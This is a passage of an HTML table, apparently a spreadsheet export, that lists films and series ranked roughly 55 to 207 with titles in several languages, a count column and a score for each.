class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">55</td> <td class="xl65">Eternal Sunshine of the Spotless Mind</td> <td class="xl66" align="right">52384</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">56</td> <td class="xl63">菊次郎の夏</td> <td class="xl66" align="right">51437</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">57</td> <td class="xl65">Once Upon a Time in America</td> <td class="xl66" align="right">51177</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">58</td> <td class="xl63">可可西里</td> <td class="xl66" align="right">50787</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">59</td> <td class="xl65">Le grand bleu</td> <td class="xl66" align="right">50572</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">60</td> <td class="xl65">Hilary and Jackie</td> <td class="xl66" align="right">49841</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">61</td> <td class="xl63">一一</td> <td class="xl66" align="right">47926</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">62</td> <td class="xl65">Casablanca</td> <td class="xl66" align="right">45970</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">63</td> <td class="xl63">耳をすませば</td> <td class="xl66" align="right">44736</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">64</td> <td class="xl65">Le papillon</td> <td class="xl66" align="right">40680</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">65</td> <td class="xl63">緃横四海</td> <td class="xl66" align="right">39829</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">66</td> <td class="xl63">英雄本色</td> <td class="xl66" align="right">39769</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">67</td> <td class="xl65">La grande vadrouille</td> <td class="xl66" align="right">39261</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">68</td> <td class="xl65">The Godfather: Part III</td> <td class="xl66" align="right">39090</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">69</td> <td dir="rtl" class="xl65">بچههای آسمان</td> <td class="xl66" align="right">39008</td> <td class="xl66" align="right">91</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">70</td> <td class="xl65">Sissi</td> <td class="xl66" align="right">37510</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">71</td> <td class="xl65">Pride and Prejudice</td> <td class="xl66" align="right">37032</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">72</td> <td class="xl65">The Green Mile</td> <td class="xl66" align="right">36347</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">73</td> <td class="xl65">PicNic</td> <td class="xl66" align="right">36174</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">74</td> <td class="xl63">买凶拍人</td> <td class="xl66" align="right">34770</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">75</td> <td class="xl65">Taxi Driver</td> <td class="xl66" align="right">32291</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">76</td> <td class="xl65">Snatch</td> <td class="xl66" align="right">32031</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">77</td> <td class="xl63">喜宴</td> <td class="xl66" align="right">32018</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">78</td> <td class="xl65">The Usual Suspects</td> <td class="xl66" align="right">31393</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">79</td> <td class="xl63">牯嶺街少年殺人事件</td> <td class="xl66" align="right">31028</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">80</td> <td class="xl65">The Gods Must Be Crazy</td> <td class="xl66" align="right">30382</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">81</td> <td class="xl65">Central do Brasil</td> <td class="xl66" align="right">30229</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">82</td> <td class="xl65">Singin' in the Rain</td> <td class="xl66" align="right">30158</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">83</td> <td class="xl63">哪吒闹海</td> <td class="xl66" align="right">28606</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">84</td> <td class="xl65">Amadeus</td> <td class="xl66" align="right">28319</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">85</td> <td class="xl65">Father and Daughter</td> <td class="xl66" align="right">27998</td> <td class="xl66" align="right">92</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">86</td> <td class="xl65">살인의 추억</td> <td class="xl66" align="right">27280</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">87</td> <td class="xl65">Good Bye Lenin!</td> <td class="xl66" align="right">26763</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">88</td> <td class="xl65">12 Angry Men</td> <td class="xl66" align="right">26336</td> <td class="xl66" align="right">93</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">89</td> <td class="xl65">Hable con ella</td> <td class="xl66" align="right">26114</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">90</td> <td class="xl65">Band of Brothers</td> <td class="xl66" align="right">25717</td> <td class="xl66" align="right">93</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">91</td> <td class="xl65">Gloomy Sunday - Ein Lied von Liebe und Tod</td> <td class="xl66" align="right">25488</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">92</td> <td class="xl65">Thelma &amp; Louise</td> <td class="xl66" align="right">25302</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">93</td> <td class="xl65">Requiem for a Dream</td> <td class="xl66" align="right">24664</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">94</td> <td class="xl65">Trois couleurs: Rouge</td> <td class="xl66" align="right">24041</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">95</td> <td class="xl65">L.A. Confidential</td> <td class="xl66" align="right">23684</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">96</td> <td class="xl65">Dances with Wolves</td> <td class="xl66" align="right">23226</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">97</td> <td class="xl65">Philadelphia</td> <td class="xl66" align="right">23053</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">98</td> <td class="xl65">Le peuple migrateur</td> <td class="xl66" align="right">22938</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">99</td> <td class="xl65">Sex and the City</td> <td class="xl66" align="right">22831</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">100</td> <td class="xl65">I Am Sam</td> <td class="xl66" align="right">22519</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">101</td> <td class="xl65">Trois couleurs: Blanc</td> <td class="xl66" align="right">22056</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">102</td> <td class="xl65">American History X</td> <td class="xl66" align="right">21088</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">103</td> <td class="xl65">Billy Elliot</td> <td class="xl66" align="right">20952</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">104</td> <td class="xl63">盲井</td> <td class="xl66" align="right">19925</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">105</td> <td class="xl63">七人の侍</td> <td class="xl66" align="right">19685</td> <td class="xl66" align="right">91</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">106</td> <td class="xl65">Pink Floyd The Wall</td> <td class="xl66" align="right">19031</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">107</td> <td class="xl65">Pink Floyd The Wall</td> <td class="xl66" align="right">19029</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">108</td> <td class="xl65">Velvet Goldmine</td> <td class="xl66" align="right">18654</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">109</td> <td class="xl65">Modern Times</td> <td class="xl66" align="right">18023</td> <td class="xl66" align="right">91</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">110</td> <td class="xl65">What's Eating Gilbert Grape</td> <td class="xl66" align="right">17581</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">111</td> <td class="xl65">The Animatrix</td> <td class="xl66" align="right">17486</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">112</td> <td class="xl65">Psycho</td> <td class="xl66" align="right">16399</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">113</td> <td class="xl65">봄 여름 가을 겨울 그리고 봄</td> <td class="xl66" align="right">16353</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">114</td> <td class="xl65">Les quatre cents coups</td> <td class="xl66" align="right">16006</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">115</td> <td class="xl65">Dogville</td> <td class="xl66" align="right">15522</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">116</td> <td class="xl65">South Park: Bigger Longer &amp; Uncut</td> <td class="xl66" align="right">15509</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">117</td> <td class="xl65">The Godfather Trilogy: 1901-1980 (V)</td> <td class="xl66" align="right">15432</td> <td class="xl66" align="right">95</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">118</td> <td class="xl65">Sissi - Die junge Kaiserin</td> <td class="xl66" align="right">14971</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">119</td> <td class="xl65">A Perfect World</td> <td class="xl66" align="right">14684</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">120</td> <td class="xl65">The Gods Must Be Crazy II</td> <td class="xl66" align="right">14441</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">121</td> <td class="xl65">HANA-BI</td> <td class="xl66" align="right">14317</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">122</td> <td class="xl65">Bicentennial Man</td> <td class="xl66" align="right">14198</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">123</td> <td class="xl63">暗恋桃花源</td> <td class="xl66" align="right">14193</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">124</td> <td class="xl63">悲情城市</td> <td class="xl66" align="right">13847</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">125</td> <td class="xl65">Gattaca</td> <td class="xl66" align="right">13192</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">126</td> <td class="xl65">Ladri di biciclette</td> <td class="xl66" align="right">12817</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">127</td> <td class="xl65">Der Himmel über Berlin</td> <td class="xl66" align="right">12626</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">128</td> <td class="xl63">乱</td> <td class="xl66" align="right">12295</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">129</td> <td class="xl65">Sissi - Schicksalsjahre einer Kaiserin</td> <td class="xl66" align="right">12156</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">130</td> <td class="xl65">CSI: Crime Scene Investigation</td> <td class="xl66" align="right">11889</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">131</td> <td class="xl65">K-PAX</td> <td class="xl66" align="right">11844</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">132</td> <td class="xl65">24</td> <td class="xl66" align="right">11280</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">133</td> <td class="xl65">John Q</td> <td class="xl66" align="right">11092</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">134</td> <td class="xl65">Melody</td> <td class="xl66" align="right">11025</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">135</td> <td class="xl65">Vampire Hunter D: Bloodlust</td> <td class="xl66" align="right">10919</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">136</td> <td class="xl65">Microcosmos: Le peuple de l'herbe</td> <td class="xl66" align="right">10422</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">137</td> <td class="xl65">Mr. Bean</td> <td class="xl66" align="right">10199</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">138</td> <td class="xl63">藍色大門</td> <td class="xl66" align="right">118919</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">139</td> <td class="xl65">엽기적인 그녀</td> <td class="xl66" align="right">111715</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">140</td> <td class="xl65">Pirates of the Caribbean: The Curse of the Black Pearl</td> <td class="xl66" align="right">104519</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">141</td> <td class="xl65">Mr. &amp; Mrs. Smith</td> <td class="xl66" align="right">103129</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">142</td> <td class="xl63">唐伯虎点秋香</td> <td class="xl66" align="right">95937</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">143</td> <td class="xl65">Corpse Bride</td> <td class="xl66" align="right">93087</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">144</td> <td class="xl65">Charlie and the Chocolate Factory</td> <td class="xl66" align="right">91189</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">145</td> <td class="xl63">喜剧之王</td> <td class="xl66" align="right">86849</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">146</td> <td class="xl65">The Day After Tomorrow</td> <td class="xl66" align="right">86708</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">147</td> <td class="xl65">Notting Hill</td> <td class="xl66" align="right">84634</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">148</td> <td class="xl65">Home Alone</td> <td class="xl66" align="right">82014</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">149</td> <td class="xl65">The Princess Diaries</td> <td class="xl66" align="right">82334</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">150</td> <td class="xl65">Face/Off</td> <td class="xl66" align="right">80791</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">151</td> <td class="xl65">The Terminal</td> <td class="xl66" align="right">79031</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">152</td> <td class="xl65">King Kong</td> <td class="xl66" align="right">78959</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">153</td> <td class="xl65">클래식</td> <td class="xl66" align="right">77900</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">154</td> <td class="xl65">50 First Dates</td> <td class="xl66" align="right">78165</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">155</td> <td class="xl63">リリイ·シュシュのすべて</td> <td class="xl66" align="right">76956</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">156</td> <td class="xl65">Interview with the Vampire: The Vampire Chronicles</td> <td class="xl66" align="right">75533</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">157</td> <td class="xl65">Sleepless in Seattle</td> <td class="xl66" align="right">75689</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">158</td> <td class="xl65">Lola rennt</td> <td class="xl66" align="right">73955</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">159</td> <td class="xl65">Identity</td> <td class="xl66" align="right">73052</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">160</td> <td class="xl63">花とアリス</td> <td class="xl66" align="right">73378</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">161</td> <td class="xl63">青蛇</td> <td class="xl66" align="right">71126</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">162</td> <td class="xl65">City of Angels</td> <td class="xl66" align="right">70654</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">163</td> <td class="xl63">独自等待</td> <td class="xl66" align="right">70643</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">164</td> <td class="xl65">Pirates of the Caribbean: Dead Man's Chest</td> <td class="xl66" align="right">70342</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">165</td> <td class="xl63">食神</td> <td class="xl66" align="right">70029</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">166</td> <td class="xl65">Harry Potter and the Sorcerer's Stone</td> <td class="xl66" align="right">68663</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">167</td> <td class="xl63">魔女の宅急便</td> <td class="xl66" align="right">68040</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">168</td> <td class="xl65">Ghost</td> <td class="xl66" align="right">67856</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">169</td> <td class="xl65">Spider-Man</td> <td class="xl66" align="right">68830</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">170</td> <td class="xl65">American Beauty</td> <td class="xl66" align="right">66831</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">171</td> <td class="xl65">A Clockwork Orange</td> <td class="xl66" align="right">66180</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">172</td> <td class="xl65">Pearl Harbor</td> <td class="xl66" align="right">67040</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">173</td> <td class="xl65">The Mask</td> <td class="xl66" align="right">64646</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">174</td> <td class="xl63">四月物語</td> <td class="xl66" align="right">63117</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">175</td> <td class="xl65">I, Robot</td> <td class="xl66" align="right">60773</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">176</td> <td class="xl65">The Graduate</td> <td class="xl66" align="right">60168</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">177</td> <td class="xl65">The Fifth Element</td> <td class="xl66" align="right">59879</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">178</td> <td class="xl65">Final Destination</td> <td class="xl66" align="right">59449</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">179</td> <td class="xl65">Madagascar</td> <td class="xl66" align="right">59301</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">180</td> <td class="xl65">Harry Potter and the Chamber of Secrets</td> <td class="xl66" align="right">59112</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">181</td> <td class="xl65">Mulan</td> <td class="xl66" align="right">59378</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">182</td> <td class="xl63">新龍門客棧</td> <td class="xl66" align="right">58154</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">183</td> <td class="xl65">Bridget Jones's Diary</td> <td class="xl66" align="right">58665</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">184</td> <td class="xl65">내 머리 속의 지우개</td> <td class="xl66" align="right">58100</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">185</td> <td class="xl65">V for Vendetta</td> <td class="xl66" align="right">56842</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">186</td> <td class="xl63">九品芝麻官</td> <td class="xl66" align="right">57125</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">187</td> <td class="xl65">Closer</td> <td class="xl66" align="right">56816</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">188</td> <td class="xl65">Harry Potter and the Goblet of Fire</td> <td class="xl66" align="right">55912</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">189</td> <td class="xl65">The Parent Trap</td> <td class="xl66" align="right">55355</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">190</td> <td class="xl65">The Rock</td> <td class="xl66" align="right">54226</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">191</td> <td class="xl65">Men in Black</td> <td class="xl66" align="right">54347</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">192</td> <td class="xl63">手机</td> <td class="xl66" align="right">54737</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">193</td> <td class="xl65">Gladiator</td> <td class="xl66" align="right">53245</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">194</td> <td class="xl65">National Treasure</td> <td class="xl66" align="right">54118</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">195</td> <td class="xl63">バトル・ロワイアル</td> <td class="xl66" align="right">53416</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">196</td> <td class="xl65">Jurassic Park</td> <td class="xl66" align="right">53612</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">197</td> <td class="xl63">新警察故事</td> <td class="xl66" align="right">54198</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">198</td> <td class="xl65">Independence Day</td> <td class="xl66" align="right">52646</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">199</td> <td class="xl63">倩女幽魂</td> <td class="xl66" align="right">52492</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">200</td> <td class="xl65">The Matrix Reloaded</td> <td class="xl66" align="right">52458</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">201</td> <td class="xl65">Independence Day</td> <td class="xl66" align="right">52567</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">202</td> <td class="xl65">Con Air</td> <td class="xl66" align="right">52359</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">203</td> <td class="xl63">臥虎藏龍</td> <td class="xl66" align="right">52451</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">204</td> <td class="xl63">国产凌凌漆</td> <td class="xl66" align="right">51849</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">205</td> <td class="xl65">Garfield</td> <td class="xl66" align="right">52053</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">206</td> <td class="xl65">True Lies</td> <td class="xl66" align="right">50850</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">207</td> <td class="xl63">大腕</td> <td class="xl66" align="right">51266</td> <td class="xl66" 